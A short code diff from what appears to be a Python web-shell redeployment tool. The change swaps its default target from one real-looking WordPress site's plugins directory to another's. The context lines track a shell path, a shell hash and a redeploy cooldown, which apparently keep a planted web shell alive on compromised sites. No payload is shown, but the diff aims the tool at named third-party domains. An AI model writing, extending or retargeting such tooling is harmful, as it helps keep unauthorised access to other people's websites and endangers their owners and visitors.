@@ -31,7 +31,7 @@ TARGET_PATH = os.path.abspath(__file__)
 # State
 current_shell_path = SHELL_PATH
 current_shell_hash = None
-domain = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://festivaldeturismodealagoas.com.br/wp-content/plugins"
+domain = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://helenanicolau.com/wp-content/plugins"
 last_redeploy_time = 0
 redeploy_cooldown = 10
 
